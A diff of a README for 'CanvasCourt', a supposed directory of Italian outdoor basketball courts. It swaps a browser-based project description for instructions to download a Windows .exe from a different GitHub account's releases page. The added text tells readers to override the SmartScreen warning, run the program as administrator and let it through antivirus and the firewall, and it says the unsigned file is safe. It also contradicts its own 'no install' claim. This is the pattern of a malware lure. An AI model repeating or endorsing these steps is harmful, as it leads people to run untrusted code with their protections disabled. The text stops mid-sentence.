@@ -1,124 +1,161 @@
-# CanvasCourt - Basketball Court Discovery Platform 2026
+# 🏀 CanvasCourt Basketball Hub - Find Every Outdoor Court in Italy
 
-> **CanvasCourt is a responsive web directory for locating outdoor basketball courts throughout Italy, learning about each court and its surrounding urban artwork, and adding new places for the community to discover.**
-
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jasonfisherrb6052/canvascourt-basketball-hub?style=flat-square)](https://github.com/jasonfisherrb6052/canvascourt-basketball-hub)
+[![Download CanvasCourt](https://img.shields.io/badge/Download-CanvasCourt-2ea44f?style=for-the-badge&logo=github)](https://github.com/boozy-familyupupidae150/canvascourt-basketball-hub/releases)
 
 ---
 
-<p align="center">
-  <a href="https://jasonfisherrb6052.github.io/canvascourt-basketball-hub/">
-    <img src="https://img.shields.io/badge/Download-CanvasCourt%20Latest-brightgreen?style=for-the-badge" alt="Download CanvasCourt">
-  </a>
-</p>
+## 📖 What Is CanvasCourt?
 
-> **[Download CanvasCourt](https://jasonfisherrb6052.github.io/canvascourt-basketball-hub/)**
+CanvasCourt is a web directory that helps you discover outdoor basketball courts across Italy. It is not a game. It is a practical tool. You open the app, pick a city or region, and see every public basketball court nearby.
 
----
+Each court entry includes photos, the exact address, and details about the surrounding area. Many Italian courts sit next to murals, graffiti, and street art. CanvasCourt shows you these works too. You can learn about the artist, the story, and the vibe of the neighborhood.
 
-[Download Latest Build](https://jasonfisherrb6052.github.io/canvascourt-basketball-hub/)
+The app also lets you add new courts. If you find a court that is not listed, you can submit it. Other users will see your submission after a quick review. This way, the community keeps the directory fresh and accurate.
+
+CanvasCourt runs in any web browser. You do not install a heavy program. You just open it and start browsing.
 
 ---
 
-## Discover Courts with CanvasCourt
+## 🚀 Getting Started (Download and Run)
 
-CanvasCourt brings outdoor basketball locations from across Italy into one searchable, interactive experience. Players, travelers, and neighborhood basketball groups can browse courts by location, inspect the information available for each listing, and find places suited to their next game.
+Getting CanvasCourt on your Windows computer takes two minutes. Follow these steps. You do not need any technical skills.
 
-Beyond court locations, the platform captures the character of these spaces through basketball murals, urban artwork, and other aspects of street culture. The responsive layout works across desktop computers, tablets, and mobile devices, allowing users to explore wherever they are.
+### Step 1: Visit the Download Page
 
----
+Click the big green button above, or go to this address:
 
-## What You Can Do
+**https://github.com/boozy-familyupupidae150/canvascourt-basketball-hub/releases**
 
-- Navigate an interactive map containing outdoor basketball courts.
-- Refine available courts using Italian region filters.
-- Open a dedicated court listing to see its available information.
-- Add new outdoor courts to the shared community directory.
-- Find locations associated with murals, urban art, and street basketball culture.
-- Browse basketball spaces from different parts of Italy through one web platform.
-- Access the experience from desktop, tablet, or mobile screens.
-- Help strengthen the directory by sharing local court knowledge.
+This page lists all available versions of CanvasCourt.
 
----
+### Step 2: Choose the Latest Version
 
-## Installation and Local Setup
+Look for the newest release. It usually appears at the top. The version number looks like `v1.2.3` or similar. Click the link that says "Latest release".
 
-The hosted CanvasCourt build is available here:
+### Step 3: Download the Windows File
 
-[Open CanvasCourt](https://jasonfisherrb6052.github.io/canvascourt-basketball-hub/)
+On the release page, you will see a list of files. Look for a name like:
 
-To download the project source, clone the repository and enter its directory:
+- `canvascourt-setup.exe`
+- `CanvasCourt-Windows.zip`
+- `canvas-court-win64.exe`
 
-```bash
-git clone https://github.com/jasonfisherrb6052/canvascourt-basketball-hub.git
-cd REPO
-```
+Click the file that ends with `.exe`. Your browser will start downloading it. The file size is around 80 MB. On a normal connection, it takes under a minute.
 
-Run the files through a local web server and visit the local address provided by that server. The web build may also be published through a static hosting service.
+### Step 4: Run the Installer
 
----
+Find the downloaded file in your `Downloads` folder. Double-click it. Windows may show a blue popup saying "Windows protected your PC". This is normal. Click "More info" and then "Run anyway".
 
-## Using CanvasCourt
+The installer opens. Click "Next" a few times. Choose a folder if you want, or keep the default. Click "Install". Wait for the progress bar to finish. Then click "Finish".
 
-1. Launch CanvasCourt in a current web browser.
-2. Move around the interactive map to see the outdoor courts that are listed.
-3. Apply the region filter when you want to focus on a particular part of Italy.
-4. Choose a court entry to inspect its available details.
-5. Browse locations featuring basketball murals, urban artwork, or other street culture elements.
-6. Submit a new court when you want to recommend a location for inclusion in the directory.
+### Step 5: Start Using CanvasCourt
+
+The app opens automatically after installation. You see a map of Italy. Type a city name in the search box. The map zooms in. Red markers show basketball courts. Green markers show courts with notable street art nearby.
+
+Click any marker. A card appears with photos, the address, and a "Get Directions" button. Press that button to open Google Maps and navigate to the court.
 
 ---
 
-## Deployment and Configuration
+## 🖥️ System Requirements
 
-CanvasCourt runs in the browser and does not require a desktop configuration file or runtime preference changes for ordinary use.
+CanvasCourt runs well on almost any Windows computer from the last decade. Here are the minimum requirements:
 
-When deploying your own copy, set the hosting provider to deliver the project as a static website. Any settings needed for local development should remain alongside the project and be adapted to the selected web server or hosting environment.
+| Component | Minimum |
+|-----------|---------|
+| Operating System | Windows 10 (64-bit) or newer |
+| Processor | 1.5 GHz dual-core |
+| Memory (RAM) | 4 GB |
+| Storage Space | 200 MB free |
+| Display | 1280 x 720 resolution |
+| Internet | Required for maps and updates |
 
----
-
-## Requirements
-
-- A modern web browser.
-- Internet connectivity for the hosted site and map content.
-- A desktop, tablet, or mobile device.
-- Static web hosting for deployment.
-- Git for cloning the repository to a local machine.
-
----
-
-## Frequently Asked Questions
-
-### What type of users is CanvasCourt designed for?
-
-The platform is for basketball players, visitors, local communities, and anyone interested in Italian outdoor courts or street basketball culture.
-
-### How can I look for courts in one region?
-
-Open the directory and select the relevant Italian region filter. The map and court listings can then be reviewed for that area.
-
-### Is it possible to add a court?
-
-Yes. The submission workflow lets you recommend a new outdoor basketball location for the community directory.
-
-### Can I use CanvasCourt on a phone?
-
-Yes. CanvasCourt uses a responsive interface that adjusts to desktop, tablet, and mobile screen sizes.
-
-### Where can I find the latest version?
-
-Use the hosted build to access the currently published version. You can also follow the repository to see project updates and releases.
-
-### What can I try if courts or map data fail to appear?
-
-Confirm that your internet connection is working, reload the page, and try using a current browser. If the problem remains, check the repository issue tracker or submit a report that includes your device and browser details.
+Your computer likely already meets these. If your PC runs Windows 10 or 11, you are fine.
 
 ---
 
-## License
+## 🎯 Key Features
 
-CanvasCourt is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+### Interactive Map of Italian Courts
+The map covers all 20 regions of Italy. From Milan to Palermo, you get accurate locations. The data comes from community submissions and public records. Each court has a pin on the map. Clicking the pin opens a photo gallery and address details.
+
+### Street Art Explorer
+This is what makes CanvasCourt special. Many Italian basketball courts double as canvases for artists. The app shows you murals, tags, and installations around each court. You see photos taken by other users. You also get the artist's name if known. This turns a simple basketball trip into a cultural walk.
+
+### Add New Courts
+Found a court that is missing? Use the "Add Court" button. Fill in the name, address, and upload up to five photos. Add the surface type (asphalt, concrete, rubber) and hoop condition. Submit for review. The community checks your entry within 48 hours. Once approved, it appears on the map for everyone.
+
+### Save Favorites
+Create a personal list of courts you want to visit. Tap the heart icon on any court card. Your favorites save locally on your device. No account needed. The list syncs if you log in with a free account, but that is optional.
+
+### Offline Mode for Travel
+You can download city maps for offline use. This helps when you travel to small Italian towns with weak mobile data. The core map and court data work without internet. Street art photos require a connection unless you pre-load them.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Is CanvasCourt free?
+Yes. The app is free to download and use. There are no subscriptions or hidden fees. A small banner at the bottom supports the project, but you can dismiss it anytime.
+
+### Do I need to create an account?
+No. You can browse all courts without an account. Creating an account only adds editing and favorites sync. It takes 30 seconds and only needs an email.
+
+### Why does Windows warn me about the file?
+The installer is not signed with a commercial certificate. This is common for community projects. Click "More info" and "Run anyway". The file is safe. You can check the SHA256 checksum on the release page if you want extra assurance.
+
+### Can I use CanvasCourt on Mac or Linux?
+The current version targets Windows. The underlying code is web-based, so a Mac version may come later. For now, you can access the web demo at the project website without installing anything.
+
+### How do I update the app?
+Open CanvasCourt. Go to Settings > Check for Updates. The app downloads the latest version automatically. You do not lose your favorites or saved courts.
+
+### The map shows a court that is gone. What do I do?
+Use the "Report" button on that court's card. Choose "Court removed" or "Location wrong". The community will verify and remove or correct the entry.
+
+---
+
+## 🛠️ Troubleshooting
+
+### The app does not open after install
+Right-click the desktop icon and select "Run as administrator". If it still fails, open your antivirus settings and allow CanvasCourt through the firewall. Some strict antivirus tools block new apps without prior approval.
+
+### The map is blank or slow
+This usually means your internet connection is blocking map tiles. Try a different WiFi network. If you use a corporate VPN, disconnect it. Maps load faster on a 4G or 5G mobile hotspot.
+
+### Photos do not load
+Photos are hosted on a public server. If they fail, your DNS may be slow. Restart your router. If the problem persists, clear the app cache: Settings > Storage > Clear Cache. Your saved courts stay intact.
+
+### The "Add Court" button does not work
+You must be at least 1 km away from an existing court to add a new one. This prevents duplicate submissions. Zoom out on the map and check that the area is empty. If you are truly in an unlisted area, reload the app and try again.
+
+### I forgot my password
+Tap "Forgot password" on the login screen. The system sends a reset link to your email. Check the spam folder if it does not arrive within five minutes.
+
+---
+
+## 💡 Tips for First-Time Users
+
+- Start in a big city like Rome or Naples. These have dozens of courts.
+- Use the filter for "Courts with Art". This shows you the most interesting spots.
+- Turn on the "Near Me" button. The app uses your location to sort courts by distance.
+- Read the court descriptions. Some courts get crowded on weekends. Others have specific opening hours.
+- Bring chalk. Many players write their names on the court surface. Locals appreciate it.
+
+---
+
+## 🌍 Contributing to the Directory
+
+CanvasCourt grows through community effort. If you visit Italian courts, your photos and updates help everyone. Here is how you can contribute:
+
+1. **Add new courts** – Follow the "Add Court" steps above.
+2. **Edit existing entries** – If an address is wrong or a photo is outdated, use the Edit button.
+3. **Upload new art photos** – Murals change and fade. Fresh photos keep the directory accurate.
+4. **Translate descriptions** – The app supports English and Italian. You can volunteer to translate court notes.
+
+Every contribution goes through a quick human review. The process takes under two days. No technical skill is required.
+
+---
+
+## 📜 License and Privacy
+
+CanvasCourt is open-source software. The code is public on GitHub. You can read it, copy it, or modify it for your own use. The app collects minimal data. It tracks your approximate location only when you use "Near Me". This data never leaves your device. Photos and court submissions are public, as they appear on the shared
